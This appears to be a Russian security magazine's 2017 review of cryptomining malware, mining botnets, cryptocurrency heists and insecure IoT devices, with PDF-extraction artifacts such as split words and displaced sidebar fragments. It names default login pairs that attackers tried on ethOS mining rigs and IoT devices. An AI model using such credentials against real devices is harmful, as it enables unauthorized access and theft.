   Если кого‐то смущает, что все перечисленные выше угрозы нацелены
на поль зовате лей Windows, заметим, что летом 2017 года специалисты ком‐
пании Symantec представили отчет, посвящен ный самым заметным угрозам
и событиям июня. Тогда одним из интересных наб людений, сде ланных ана‐
лити ками,  стал  внезапный  рост  «популяр ности» майнинговой малвари
для Mac.
  Оказалось, что майнинговый тро ян DevilRobber (он же Intego, Miner‐D
и OSX.Coinbitminer), впервые обнаружен ный еще в 2011 году, начал стре‐
мительно набирать «популярность». Если в мае 2017 года доля DevilRobber
составляла все го 2,4%, то уже в июне троян продемонстри ровал взрывной
рост и наб рал 21,6%, в ито ге заняв вто рое место в рейтинге наиболее рас‐
пространенных угроз для Mac.


Ботнеты и корпоративный сегмент
Продолжать перечисление майнинговой малвари, нацеленной на прос тых
поль зовате лей, мож но очень долго, но общая идея уже ясна. Поэтому пора
перейти к сле дующему «витку спи рали» — к май нинговым ботнетам. Бот неты,
чья основная цель — добыча криптовалюты, появи лись отнюдь не недавно,
но в 2017 году они значительно укрепили свои позиции.



             «Только за пос ледний месяц мы обна ружили
            нес колько  круп ных  бот‑сетей,  нап равленных
            на получе ние прибыли от скры того майнинга.
         Мы так же отме чаем рост количес тва попыток
             уста нов ки  майнеров  на  сер веры  орга низа-
              ций», — рас ска зыва ли экспер ты «Лабора тории
            Кас пер ского» в сентябре 2017 года.



В сво ем отчете спе циалисты «Лабора тории Кас перско го» сообщили, что
чаще все го для скры того майнинга выбираются Monero (XMR) и Zcash. Обе
крип товалю ты обладают свойством аноним ности транзакций, что играет
на руку зло умышленни кам. По самым скромным оценкам исследователей,
каждая майнинговая сеть в сред нем приносит своим владельцам до 30 тысяч
долларов в месяц.





На иллюстрации выше можно увидеть кошелек такого майнингового ботнета.
В общей сложности на него было переведено 2289 XMR, что на момент
выхода отче та было экви валентно 208 299 дол ларам США. При условии, что
обычный стационарный компьютер выдает мощность 30–100 хешей в секун‐
ду, можно под считать, что ботнет нас читыва ет приб лизительно четыре тысячи
машин.
  О похожих наб людени ях писали и специалис ты дру гих компаний. Так,
в мае 2017 года аналити ки компании GuardiCore об наружили ботнет, сос‐
тоящий из 15 тысяч серверов, которые используются для май нинга крип‐
товалю ты и приносят сво ему операто ру около тысячи долларов в день.
  Данный бот нет воз ник еще в декабре 2016 года, но быстро раз росся
до 15 тысяч машин, работающих под управлением Windows Server, из которых
при мерно две тысячи активны ежедневно. Специалисты GuardiCore полага ют,
что оператор ботнета находится на территории Китая и, судя по обнаружен‐
ным в коде комментариям, скрывает ся под псев донимом Bond007.01.





В основном Bond007.01 интересует Monero, но также зараженные серверы
майнили Bytecoin, Riecoin и Zcash. Быстрый рост ботнета экспер ты объяснили
тем, что зло умыш ленник не жалел сил и вре мени на «раз витие» BondNet.
   Bond007.01 полагается на разные тех ники, комбинирует раз личные экс‐
пло иты и брут форс‐атаки, взламывая как сис темы с ненадежными учетными
данными RDP, так и более защищенные машины. В последнем случае зло‐
умыш ленник эксплуатирует уязвимости в phpMyAdmin, JBoss, Oracle Web Ap‐
plication Testing Suite, ElasticSearch, MS SQL, Apache Tomcat, Oracle Weblogic
и так далее.
  Похожим обра зом действу ют операто ры другого ботнета, о котором
в октябре предупредили специалисты компании ESET. Ата кующие заража ют
веб‐серверы май нером криптовалюты Monero (XMR), и операция продол‐
жается как минимум с мая 2017 года.
  Для скрытой установки майнера на веб‐серверы атакующие исполь зуют
CVE‐2017‐7269 — уяз вимость служ бы WebDAV в опе раци онной сис теме Win‐
dows Server 2003 R2, най денную в марте 2017 года. Злоумышленни ки, сто‐
ящие за данной кампанией, незначительно изменили легитимную и опенсор‐
сную прог рамму xmrig для добычи Monero, добавив в код адрес своего
кошелька   и   май нин говый   пул  URL   (версия    0.8.2,   пред став‐
ленная 26 мая 2017 года).
  На момент выхода отчета ESET сеть атакующих нас читывала нес коль ко сот
зараженных машин, которые добывали порядка 5,5 XMR в день. Итоговый
зарабо ток преступников за три месяца составил 420 XMR. При курсе 150 дол‐
ларов за 1 XMR доход опе рато ров майнера равнялся 825 долларам в день, то
есть сос тавил больше 63 тысяч долларов в общей сложности.
  Мож но сме ло сказать, что рост количес тва атак на кор поративные сети
с целью майнинга крип товалют в этом году отме тили практически все
ИБ‐ком пании. К примеру, по данным IBM X‐Force, число таких атак воз росло
в шесть раз за период с января по август 2017 года.
  Спе циалисты IBM пишут, что зло умышленни ки активно применяют сте‐
ганографию, то есть прячут вредоносный код в файлах изображений, которые
затем размещают на зараженных серверах популярных CMS (WordPress,
Joomla, JBoss и так далее). Для пер вичной компромета ции серверов зло‐
умыш ленни ки применяют самые разные тех ники, «обширные наборы экс пло‐
итов» и CMDi (command injection).
  Непос редс твенно для май нинга преступники чаще всего исполь зуют
легитимный инс трумент Minerd или его Linux‐порт kworker. Также сообщает ся,
что чаще всего атакующих интересуют вов се не Bitcoin и Ethereum, а крип‐
товалю ты, которые работа ют с протоко лом CryptoNote. В основном злоумыш‐
ленники майнят Monero, но также их внимание прив лекают Bytecoin (BCN),
Boolberry (BBR), Dashcoin (DSH), DigitalNote (XDN), DarkNetCoin (DNC), Fan‐
tomcoin (FCN), Monero (XMR), Pebblecoin (XPB), Quazarcoin (QCN), Anonymous
Electronic On‐line Coin (AEON).


Проб лемы майнин говых устройств
Следует заос трить вни мание и на том, что домаш ние и корпоративные поль‐
зователи зачастую становят ся жертвами прес тупни ков из‐за собственной
халатности. Выше уже неод нократ но говори лось о том, что для компромета‐
ции сер веров и поль зовательских устройств зло умышленни ки экс плуатируют
раз личные известные уязвимости. Но кроме это го, не обходится и без
«излюбленной» голов ной боли ИБ‐специалистов — плохих паролей, открытых
пор тов и неп равильно настроенных девайсов.
  В августе 2017 года известный ИБ‐спе циалист и глава организа ции GDI
Foundation Виктор Геверс (Victor Gevers) рас сказал о не сов сем обычной
находке. Он обнаружил в Сети 2893 устрой ства для майнинга Bitcoin, которые
были доступны кому угод но посредством Telnet. Пароль не тре бовался.
  Все «аси ки» (от английского ASIC, application‐speciﬁc integrated  circuit)
работа ли с одним пулом и, похоже, при надлежали одной компании‐вла дель‐
цу, которая, судя по IP‐адресам, была каким‐то обра зом свя зана с пра‐
вительством Китая. Спе циалист предположил, что нашел целый «парк»
устройств ZeusMiner THUNDER X3.





Ге верс наблюдал за про исхо дящим два дня и уже собирался попытать ся вый‐
ти на связь с неизвестным вла дельцем «шахты», но это не пот ребовалось.
Похоже, после тви та Геверса о проблеме кто‐то уве домил хозя ев уяз вимых
устройств о про исходящем, и почти все они «пропали с радаров» специалис‐
та и перестали быть доступны пос редс твом Telnet.
  В ноябре 2017 года очень похожую проблему заметили спе циалисты ком‐
пании Bitdefender. Им уда лось об наружить ата ку, направленную против обо‐
рудования для майнинга, работающего под управле нием ethOS. Атакующие
массово ска нировали интернет в поис ках таких майнеров, а затем пытались
использовать  учетные дан ные SSH по умолчанию. Если им уда валось
получить доступ к системе, они попросту под меняли адрес Ethereum‐кошель‐
ка вла дельца собственным.
   Установленные спе циалистами ханипоты зафик сирова ли, что злоумыш‐
ленники пыта ются использовать для получе ния дос тупа к обо рудованию два
сочетания логина и пароля: ethos:live и root:live. Бег лый поиск в Сети помог
определить, что эти учетные данные используются по умол чанию в дистри‐
бути ве  ethOS, который пред назна чен для  уста новки на GPU‐майнеры,
добывающие Ethereum, Zcash, Monero и так далее.





Взло мы, кражи и неудавшиеся ICO
Разуме ется, интерес прес тупников к криптовалютам не ограничи вает ся толь‐
ко скры тым май нингом и написанием новой малвари. В 2017 году множес тво
ком паний, обменников и других сер висов постра дали от прямых атак со сто‐
роны зло умышленников, в результате лишив шись огромных сумм. Вспомним
наибо лее круп ные криптовалютные ограбления года.
  Настоящей чередой взло мов озна мено вался июль 2017 года. Первым
от хакерской атаки в начале месяца пострадал Classic Ether Wallet — кошелек
для крип товалю ты Ethereum Classic (ETC). Преступники применили соци аль‐
ную инже нерию и сумели ввести в заб лужде ние сотрудников хостинг‐провай‐
дера 1on1, выдав себя за настоящих владельцев домена проекта. Перехватив
контроль над доменом, неизвес тные незамедлительно перенап равили поль‐
зователей на свой сер вер, в резуль тате чего чужие деньги осе дали в их «кар‐
манах».
   Когда пользователи поняли, что происходит, под нялась паника, даже пос‐
тупали предложения устроить DDoS‐атаку на домен Classic Ether Wallet, чтобы
увести его в офлайн, так как это казалось наиболее быстрым способом оста‐
новить деятельность злоумыш ленников. К счастью, идти на такие крайние
меры не приш лось: уже через несколько часов адми нистра ция Classic Ether
Wallet, при под держке ИБ‐экспертов, сумела убе дить специалистов ком пании
Cloudﬂare внести домен в черный список, что и спас ло ситу ацию.
  На Reddit пос традав шие пользователи поделились рядом ETC‐адресов,
на которые в ито ге попали их средства. Уда лось под счи тать, что суммарно
злоумышленники успе ли похитить порядка 300 тысяч долларов США в ETC‐
эквиваленте.
   Вто рой жер твой злоумышленников стала южно корейская криптовалютная
биржа Bithumb, четвертая по величине в мире. Еще в конце июня поль зовате‐
ли биржи замети ли, что с их счетов начали пропадать крупные суммы (в
основном Bitcoin и Ethereum). В первых числах июля адми нис трация сер виса
под твердила, что происходящее — пос ледс твия хакерской ата ки.
  Представите ли Bithumb рас сказали СМИ, что неизвес тные злоумыш‐
ленники сумели ском промети ровать компьютер одно го из сотрудников бир‐
жи, после чего получили доступ к информа ции о 31 800 поль зовате лях ресур‐
са (порядка 3% от всей пользовательской базы). В результате прес тупни кам
удалось похитить документы, содержащие имена поль зовате лей, email‐адре‐
са и номера мобильных телефонов. При этом оста лось не совсем ясным,
как именно зло умышленни ки получили доступ  к акка унтам своих жертв
и сумели похитить денежные средства. Судя по всему, в дело пошла соци аль‐
ная инже нерия, основанная на укра денных дан ных.
   Третьим пострадав шим сервисом стал изра иль ский стартап CoinDash,
который был взло ман в ходе проведения ICO (Initial Coin Oﬀering, первичного
раз мещения токенов). ICO является сво еоб разным аналогом IPO. Посредс‐
твом ICO  стартапы, по  сути, привлекают финан сирова ние:  за  Bitcoin,
Ethereum и другую крип товалю ту инвесто ры покупают у компании токены,
которые могут исполь зоваться для пос ледующей оплаты услуг. Для компании
это «живые» деньги, а для инвесторов, возможно, неп лохое вложение, так
как со вре менем токены имеют свой ство при бавлять в цене.
  К сожале нию, ICO CoinDash практичес ки сра зу обернулось про валом.
Дело в том, что через три минуты после раз мещения токенов неиз вестные
злоумышленники ском промети ровали сайт CoinDash и подменили адрес
офи циального Ethereum‐кошелька собствен ным.
   Хо тя взлом обнаружили быстро и раз работ чики CoinDash немедленно
останови ли ICO (которое должно было длиться 28 дней), уве ли сайт в офлайн
и предуп редили поль зователей об ата ке через официальный твиттер и канал
Slack, было уже поз дно. Дело в том, что только за первые пять минут пос ле
взло ма на кошелек хакеров перевели более 6 мил лионов дол ларов. В итоге
злоумышленники «зарабо тали» 43 488 Ethereum (8,3 мил лиона долларов
по курсу на тот момент).
  Редкий случай, но эта история име ет почти хороший конец. Спустя два
месяца после инцидента предста вители CoinDash неожиданно сообщили, что
злоумышленники вернули на один из кошель ков компании 10 000 ETH, то есть
почти 3 миллиона долларов по курсу на тот момент. Что именно толкнуло
хакеров на этот шаг, неизвес тно. Руководители CoinDash под черкну ли, что
преступники не выходили с ними на связь и не делали никаких офи циаль ных
заяв лений, поэтому об их мотивах оста ется лишь догадываться.
   Четвертый взлом был очень похож на про изошед шее с CoinDash: во вре мя
ICO платформу Veritaseum взломали неизвестные лица. Хотя количество
похищенных токенов ока залось «ничтожным» (всего 0,07%), в дол ларовом
эквиваленте ограбле ние все же выг лядело внушительно. Так, основатель Veri‐
taseum Регги Миддлтон (Reggie Middleton) сооб щил, что на продаже токенов
злоумышленники «заработали» 8,4 миллиона дол ларов. Изначаль но средс тва
осе ли на двух Ethereum‐кошельках, но вско ре были переве дены на дру гие
аккаунты, так как взлом щики начали отмывать похищенное.
  К счастью для поль зователей, украден ные токены принадлежали самой
Veritaseum, то есть пользователи не понесли никаких финансовых потерь и не
воз никло необходимости выкупать токены обратно.
  Пятым инци ден том стала уяз вимость в Ethereum‐кошельке Parity, которая
при вела к хищению 30 миллионов долларов. Неизвес тные воспользовались
багом в контракте с мультипод писью, который поз волял им похищать средс‐
тва из чужих кошельков. В результате действий хакеров пос традали все поль‐
зователи, имев шие дело с кошельками с мультиподписью, соз данны ми рань‐
ше 19 июля 2017 года. В карманах прес тупни ков осело 153 000 ETH, то есть
порядка 30 миллионов долларов на тот момент.
   Атака произош ла 19 июля 2017 года и была практически сра зу замечена
раз работ чиками. Так же помогать пострадавшим оперативно взялась группа
энту зиастов, называющих себя The White Hat Group. В сос тав The White Hat
Group вошли ИБ‐эксперты и члены Ethereum Project. Вос пользовавшись тем
же эксплоитом, что и зло умышленники, ИБ‐специалис ты начали спа сать
деньги пользователей, переводя их на не подверженный багу кошелек.
В результате в руках груп пы оказалось 377 105 ETH, то есть более 85 мил‐
лионов дол ларов, которые white hat’ы начали возвращать закон ным владель‐
цам пос ле устранения бага.
   Разработ чики Parity сооб щили, что суммарно насчитыва лось 596 уяз вимых
кошельков и основной удар зло умышленников пришелся на три из них (к при‐
меру, о краже 82 000 ETH заяви ли раз работчики проекта Aeternity). Сог ласно
офи циальным данным, возможность эксплуатации бага была бла гопо лучно
закрыта. Раз работ чики изви нились за случившееся и обещали запус тить
собствен ную bug bounty прог рамму, чтобы впредь не допус кать подобных
оши бок.
   Увы, сдержать это обещание команда стартапа в итоге не сумела. В нояб‐
ре 2017‐го разработ чики опубликова ли в блоге предупреждение, сооб‐
щавшее, что в биб лиотеке, отвечающей за работу смарт‐контракта, который
используют кошель ки с мультипод писью, был обнаружен кри тический баг.
Уязвимость поз воляла прев ратить проб лемную биб лиоте ку/контракт в обыч‐
ный кошелек с муль типод писью, а затем стать его владельцем, задействовав
функцию initWallet. Именно это проделал некто, извес тный под псевдонимом
Devops199.
   Случайно (?) обнаружив баг и получив полный кон троль, Devops199 отдал
коман ду на самоунич тожение контрак та, что вывело из строя мно жество
кошельков с мультиподписью, а все средства на них оказались блокированы.
Поз же Devops199 уве рял, что не осоз навал пос ледствия своих дей ствий, так
как он новичок в области криптовалют вообще и Ethereum в частности.
   Как оказалось, к появ лению фатальной ошиб ки в коде при вели летние
изме нения, сделанные наспех пос ле опи сан ной атаки. Хотя изначаль но сооб‐
щалось, что дей ствия Devops199 привели к «замороз ке» 300 миллионов дол‐
ларов,  согласно  опубликованному  командой   Parity  отчету  постра‐
дали 587 кошельков и заб локирован ными оказались средства  в  раз‐
мере 513 774 ETH (порядка 160 миллионов дол ларов по курсу на тот период).
   Разработ чики   признали,   что   пользователь   GitHub,   известный
под ником 3esmit, предупреждал компанию о проб леме еще минув шим летом
и даже предлагал способы ее исправления. Пред ставители Parity уверяют, что
вос при няли пред ложение пользователя со всей серь езностью и оце нили его
по достоинству, яко бы в будущем Parity должен был получить соответству‐
ющий апдейт, однако написать и выпус тить его разработчики не успели. De‐
vops199 нашел баг раньше.
  Соз датели Parity до сих пор не придумали, как «вызволить» пострадавшие
средства поль зователей. Судя по всему, наиболее вероятными варианта ми
решения проблемы остаются хардфорк и EIP15.





          работ чики Bitcoin Gold (BTG) предуп редили пользовате лей о воз‐ →Раз
      можной бре ши в безопасности. Неизвес тные лица подменили уста‐
       новщик Windows‐кошель ка, ссылка на который была опубликова на
       на офи циаль ном сайте, «подоз ритель ными фай лами неиз вестного
      происхожде ния»

         ководители   криптовалютного   стар тапа   Tether   сообщили, →Ру
       что 19 ноября 2017 года неизвес тный злоумышленник похитил у ком‐
       пании 30 950 010 долларов в USDT

          ландскую биржу  LiteBit.eu дваж ды атаковали злоумыш ленники. →Гол
     В обо их случаях у пользователей ресурса не были похищены денеж‐
      ные средства, однако взлом щикам уда лось завладеть их личными
       данными

            тап Conﬁdo рек ламировал себя как удобное блокчейн‐приложе‐ →Стар
      ние для осуществле ния платежей и отслежива ния поставок. Conﬁdo
      провел первичное размещение токенов, в ходе которого уда лось
      соб рать 374 тысячи долларов. Что теперь делать инвесторам стар‐
        тапа, не совсем ясно, так как Conﬁdo оказался обычной афе рой и его
       руководство скры лось со все ми соб ранными деньгами
ИНТЕРНЕТ (ДЫРЯВЫХ)
ВЕЩЕЙ


В прош лом году немалая часть нашего ито гового отчета бы ла пос вящена
небезо пасности интернета вещей (Internet of things, IoT). К сожалению, год
спус тя мы не можем сообщить о сколь‐нибудь заметных изме нени ях к луч‐
шему в данной области.
  Мир по‐прежнему страдает от кло нов вредоноса Mirai и многочисленных
бот нетов. Произво дители  по‐прежнему  считают нор маль ным  выпус кать
на рынок устройства с жестко закодированными учетными данными admin:ad‐
min. Личные данные поль зователей регуляр но ока зыва ются под угро зой из‐за
дет ских игрушек, «умных» плит, холодильников, виб раторов и множества дру‐
гих устройств. На наших глазах в жизнь воплоща ются худшие прогнозы ана‐
лити ков, которые давно предрекают, что проблемы будут только рас ти вмес те
с массовостью IoT.





Ботнеты
В 2016 году появление вре доно са Mirai озна мено вало собой новую эру. Ста‐
ло ясно, что интернет вещей уже наб рал кри тическую мас су и теперь с бот‐
нетами, состоящи ми из камер, роутеров, телеви зоров и прочих IoT‐гад жетов,
при дется счи таться.
   Так как осенью 2016 года исходные коды  Mirai были опубликованы
в открытом дос тупе, все жела ющие получили возможность создать собс твен‐
ный ботнет и разработать свою вер сию вредоноса. Хотя авторы ори гиналь‐
ной вер сии Mirai в нас тоящее время на ходятся под следствием и понесут
наказание за соде янное, можно без преуве личе ния сказать, что плоды этого
рас крытия исходни ков ИБ‐спе циалистам придет ся уничтожать еще долго.
Ведь именно после публикации исходных кодов появи лось множес тво клонов
Mirai, под ражателей и последователей. Ниже соб раны нес колько наиболее
ярких примеров.
  В марте 2017 года специалис ты Imperva Incapsula рассказали о появлении
нового бот нета, использующего весьма стран ную версию трояна Mirai. Ранее
все версии вредоноса объеди нял своеобразный «общий зна мена тель» — все
они применяли для орга низации DDoS‐атак network layer. Но иссле дователи
обнаружили ботнет, устроивший затяжную application layer атаку на неназ‐
ванное учеб ное заведе ние.
   Атака началась 28 февраля и длилась 54 часа без перерывов. Целью неиз‐
вестных стал аме риканский колледж, и сред няя мощность атаки составля‐
ла 30  тысяч  зап росов  в  секунду,  тог да  как  пиковая мощ ность  дос‐
тигала 37 тысяч зап росов. Сум марно за два с половиной дня Mirai‐ботнет
сге нерировал 2,8 миллиарда запросов. Ана литикам удалось зафик сировать
активность 9793 IP‐адре сов в самых разных угол ках мира.





Hajime — еще один ботнет, за которым специалисты наблюдают с кон‐
ца 2016 года. Hajime интересует исследователей больше других вре доносов:
это своеоб разная «темная лошадка» сре ди IoT‐малвари — его предназна‐
чение до сих пор неясно.
   Аналити ки Symantec полагают, что малварь мог создать неизвестный white
hat, который вооб ще не имел никаких дурных намере ний. Эта теория под‐
креп ляется тем фак том, что после зараже ния вредонос блокирует порты 23,
7547, 5555 и 5358, которые чаще всего атакует дру гая мал варь, включая Mirai.
При этом Hajime не имеет функций, поз воля ющих осущест влять атаки,
и содержит только модуль, отве чающий за рас пространение.
  Спе циалисты «Лаборатории Касперского», которые  также наблюдают
за угрозой, подсчитали, что под контролем Hajime находятся поч ти 300 тысяч
гаджетов по всему миру, тог да как исследова тели Symantec писали лишь
о 10 тысячах заражен ных устройств.
  В нояб ре 2017 года Qihoo 360 Netlab и компания Check Point не на шутку
напугали мировое ИБ‐сооб щество, про информировав о появ лении нового
IoT‐ботнета, которо му предрекли «сла ву»  Mirai. Ботнет получил наз вание
Reaper, и сообщалось, что в его сос тав уже входит более миллиона «умных»
устройств.
  Малварь распространяется через экс плуата цию различных уяз вимостей
в устройствах D‐Link, TP‐Link, Avtech, Netgear, MikroTik, Linksys и Synology.
Именно это отличает Reaper от дру гих IoT‐ботнетов, которые, как правило,
полага ются на простые Telnet‐ска неры и списки учетных данных по умол‐
чанию, как делал Mirai.
   Аналити ки ком пании  Arbor Networks предста вили собственный  отчет
о про исходящем, в котором не во всем разделили мнение коллег. Так,
по данным иссле дователей, реальное число ботов Reaper не пре выша ет 10–
20 тысяч, с чем в ито ге сог ласились и спе циалисты Netlab 360, тоже скор‐
ректи ровав шие свою ста тистику. Впро чем, исследова тели полагают, что
еще около двух миллионов IoT‐устройств дей ствительно могут рассмат‐
риваться как потенциаль ные мишени для заражения Reaper.
  В нояб ре и декабре 2017 года спе циалисты также обнаружили резкий
при рост активности Mirai‐бот нетов в Аргентине, который связывают с обна‐
родовани ем в публичных базах уяз вимос тей нового proof‐of‐concept экспло‐
ита для роутеров ZyXEL.
  Неизвестные злоумыш ленники взяли новый экс плоит на воору жение, при‐
няв шись искать и заражать проб лемные устройства. По данным Qihoo 360
Netlab, за 60 часов наб людений удалось обнаружить более 100 тысяч IP‐
адресов, ведущих сканирования.
  В декаб ре воз никла любопытная теория, связыва ющая данный всплеск
активнос ти с новым Mirai‐ботнетом Satori. Иссле дова тели утверждают, что
бот нет возник 5 декабря 2017 года, словно ниот куда, и принял ся массово
сканиро вать пор ты 37215 и 52869. Все го за 12 часов наблюдений удалось
заметить, что активность Satori исходит более чем с 280 тысяч разных IP‐
адресов.
  Данная вариация Mirai заметно отличается от пре дыдущих версий. Если
обычная вер сия Mirai работает как Telnet‐ска нер, при этом используя длин‐
ные списки дефолтных логинов и паролей, то Satori име ет на вооружении два
эксплоита. Так, по данным Qihoo 360 Netlab, 263 250 IP‐адресов сканируют
порт 37215 в поисках новых жертв, а еще 19 403 IP‐адре са сканируют
порт 52869.
  Судя по все му, порт 37215 исполь зует ся для эксплуатации некой уяз‐
вимос ти нулевого дня, чем и объ ясняется стремительный рост ботнета Satori.
Дэйл Дрю (Dale Drew), главный стра тег по вопросам безопас ности крупного
про вай дера CenturyLink, предположил, о какой именно уязвимости может
идти речь.
  По мне нию Дрю, Satori экс плуати рует 0day‐баг в роутерах Huawei Home
Gateway. Уязвимость, поз воляющую выполнить на этих устройствах про‐
извольный код, в конце нояб ря 2017 года обнаружили спе циалис ты компании
Check Point. К сожале нию, подробностей о данной бре ши пока практически
нет. По  дан ным  поисковика  Shodan,  в  онлайне можно  обнаружить
не менее 225 тысяч уяз вимых девайсов.





Эксплоит для пор та 52869, который также использует Satori, — это известная
и довольно старая уязвимость в устрой ствах ком пании Realtek (CVE‐2014‐
8361). В боль шинстве случаев обновление, зак рыва ющее эту брешь, уже дав‐
но установлено на устройствах, и, очевидно, имен но этим объясняется мень‐
ший успех таких сканиро ваний.
   «Аргентинская» вер сия Mirai также использует ряд эксплоитов для IoT‐
устройств, и спе циалисты Qihoo 360 Netlab отмечают, что Satori и этого вре‐
доноса «род нят» оди наковые имена некото рых фай лов и C&C‐протоколы.





         наружен новый вариант ботнета Tsunami — Amnesia. В сос тав бот‐ →Об
       нета вхо дят уязвимые DVR‐девайсы китайско го производите ля TVT
          Digital, которые продаются по всему миру более чем под 70 раз личны‐
      ми брендами

         сперты Trend Micro заметили появление нового IoT‐бот нета Persirai. →Эк
       Угроза ата кует более тысячи различных моделей камер, экс плуатируя
       известные уязвимости, а затем использует зараженные устройства
       для проведения DDoS‐атак

            Pastebin  опуб ликован  огромный  список  IP‐адресов  и  пар →На
       логин‐пароль  для  «умных»  устройств. В  большинс тве  слу чаев
       это были учетные данные по умол чанию, то есть admin:admin, root:root
      и так далее





Умные и опасные
Одна из основных проблем интернета вещей — халат ность про изво дите лей
«умных» устройств. Специалис ты по информа ционной безопасности регуляр‐
но обнаруживают критические уязвимости в IoT‐гад жетах, и зачастую такие
баги вообще не получа ют каких‐либо исправ лений. Из‐за таких «дыр» устрой‐
ства не толь ко становят ся участни ками ботнетов, но и ставят под угрозу лич‐
ные данные своих владельцев, превращаясь в опасных соглядатаев и «сла‐
бое звено» в безопасности. Примеров опас ного поведе ния «умных» гаджетов
можно при вести множес тво.
  Спе циалисты ком пании Rhino Security Labs нашли опасный баг в сервисе
Amazon Key. Данное новшество компании Amazon с самого начала вызвало
много вопросов как у простых пользователей, так и у экспертов по безопас‐
ности.
  Сер вис для «умных» домов был пред ставлен в конце октября 2017 года
и объединил камеры Cloud Cam с подходящими замками (к при меру, Yale
и Kwikset), что бы гаджеты мог ли самостоятельно впускать в дома поль зовате‐
лей курьеров, уборщиков и другой обслуживающий персонал, пока хозяев нет
дома. Контро лировать выдачу «клю чей» пользователи могут с помощью спе‐
циального приложе ния, и Amazon Key уже заработал для доставки товаров
с самого Amazon.
   Так, чтобы попасть в дом или квар тиру, курьер Amazon дол жен при ехать
в назначенное вре мя, просканировать штрих‐код, который проходит проверку
в облаке, и толь ко после этого замок откро ется. Камера дополнительно фик‐
сирует все про исходящее, что бы пользователь мог просмотреть запись
или видео с камеры в прямом эфире и убедить ся, что во вре мя доставки
не про изош ло ничего подозрительного.
   Аналити ки Rhino Security Labs пришли к выводу, что злоумыш ленник может
обмануть сис тему, остановить видеозапись и повторно про никнуть в квартиру
поль зовате ля после или во вре мя доставки посылки.
  Не менее опасную уязвимость эксперты ком пании Check Point об наружили
в инфраструктуре «умных» домов, где используются решения LG. Уяз вимость
была найдена в составе приложения LG SmartThinQ, при помощи которого
поль зовате ли могут управлять раз личными устройствами, в том чис ле пли‐
тами, кондиционе рами, посудомоечными и сти ральными машинами, пылесо‐
сами.
   Как оказалось, атакующий может скомпро мети ровать процесс аутен‐
тификации между SmartThinQ и бэкендом LG. В результате зло умышленник
перехватит управление аккаунтом пользователя и смо жет контролировать все
IoT‐девайсы, при вязанные к данному профилю. Затем можно будет устра‐
ивать ата ки в стиле «Мистера Робота», к примеру спровоцировать перегрев
духовки, изме нить температуру в помеще нии или попросту следить за своей
жертвой через камеры, встроенные в «умные» устройства.
   Также в этом году ста ло понятно, что параноикам явно не стоит при обре‐
тать «умные» колонки производства Google или Amazon.
  Спе циалист компании MWR Labs до казал, что колонки Amazon Echo, уком‐
плектованные голосовым ассистентом Alexa, мож но превратить в подслу‐
шивающие устрой ства, работающие на благо злоумыш ленни ка. Эксперт при‐
шел к выводу, что модели колонок, выпущенные в 2015–2016 годах, уязвимы
перед атаками типа evil maid («злая гор ничная»; то есть подобный хак может
подстроить вхожий в дом жертвы человек, с дос тупом к Amazon Echo).
Это означает, что атакующий может получить root‐доступ к устройству и зас‐
тавить колонку тайно перехватывать сигнал с микрофона и переда вать куда
заблагорас судит ся.
  Представ ленные осенью 2017 года домашние колонки Google Home Mini
и Max, со встро енным голосо вым помощником Google Assistant, обла дают
похожей проб лемой, только в данном случае за владельцами устрой ств
«шпиони ла» сама компания Google.
  Изъян  заметил журналист Артем  Рус саковский  (Artem  Russakovskii),
получивший девайс на официальной пре зентации. Хотя устройство дол жно
акти вироваться, толь ко ког да «услышит» голосо вые команды «OK, Google»
или «Hey, Google», а также длинным нажати ем на специаль ную панель, ока‐
залось, что Google Home Mini включает ся самоп роиз вольно, записывает все,
что происхо дит вок руг, а затем отправляет эти данные на серверы Google.
   Как только журналист сооб щил о происходящем спе циалис там Google,
сбо ящее устрой ство немедленно заб рали для проведе ния тес тов. Как позже
сообщили Руссаковскому, причиной самопроиз вольных включений и круг‐
лосуточного шпи онажа устрой ства стал некий аппарат ный баг в работе сен‐
сорной панели (очевидно, она оказалась слиш ком чувстви тельной, что
и вызывало «фантомные нажатия»).
  Чем еще могут гро зить пользователям уязвимос ти в IoT‐устройствах?
Всем чем угод но, начиная от пригоревшего пирога и заканчивая физичес‐
кими травмами. Ниже перечислены лишь некоторые проб лемы, найденные
ИБ‐спе циалистами в 2017 году.





         сле дователи компаний Whitescope и QED Secure Solutions удален‐ →Ис
      но взломали бесконтактную автомойку PDQ LaserWash, заставив
       автомати ческие  две ри и механи чес кие манипуляторы  ата ковать
       находящийся внутри автомобиль

         лее чем 465 тысячам пациентов с кардиостимуля торами придется →Бо
      обратиться  к  врачам  за  получе нием  критического  обновления
       для сво их устройств. Дело в том, что кар диостимуляторы и дефиб‐
       рилляторы компании St. Jude Medical содер жат многочисленные уяз‐
      вимости

         сперты Pen Test Partners ском промети ровали «умный» виб ратор →Эк
      Svakom Siime Eye, оснащен ный встроенной камерой. Оказалось, что
       злоумыш ленники могут не только получить доступ к чужим интимным
      записям и трансляциям, но и вообще подменить про шивку устройства

           литик Equus  Software провел аудит безопас ности ОС  Tizen, →Ана
      под управлением которой работают гаджеты Samsung: около 30 мил‐
       лионов «умных» телеви зоров, сти ральные машины, холодильники,
       часы, а также некоторые смартфо ны. Эксперт выявил в ОС более
       сорока уязвимостей нулевого дня и при шел в ужас от качес тва кода

          циалис ты Pen Test Partners обнаружили, что пли ты серии iTotal →Спе
        Control, про изведен ные компани ей Aga, можно ском прометировать,
      просто отправив им неавторизо ванное SMS‐сообщение





BrickerBot
В конце марта 2017 года специалисты компании Radware об наружили стран‐
ную малварь BrickerBot, которая выводи ла из строя IoT‐устрой ства, умыш‐
ленно повреждая ядро и делая невозможным хра нение данных. Вредонос
«охо тился» на устройства Linux BusyBox. Изначально иссле дователи нашли
две версии BrickerBot (BrickerBot.1 и BrickerBot.2), а позже бы ли замече ны
улучшенные вариации — BrickerBot.3 и BrickerBot.4.
  Во вре мя пер вой фазы атаки BrickerBot действу ет точно так же, как Mirai,
Hajime, LuaBot и другая IoT‐малварь: ведет словар ную атаку, то есть брут‐
форсит устройство через Telnet, пыта ясь подоб рать учетные данные. В коде
вре доно са жестко закодированы списки логинов и паролей по умолчанию,
используемые для разных устройств.
   Если учетные данные подошли, начина ется вторая фаза ата ки, в ходе
которой BrickerBot поврежда ет устройство. Чтобы вывести девайс из строя,
BrickerBot использует нес колько различных тех ник, и именно в них заключа‐
ется разница между версиями вредоноса. Тем не менее цель всег да одна –
прев ратить устройство в бесполезный «кирпич».
  В результате гаджет перестает работать за считаные секунды пос ле
зараже ния. Эксперты относят такие атаки к PDoS (Permanent Denial of Service,
«пос тоянный отказ в обслуживании»), а также называют их phlashing.
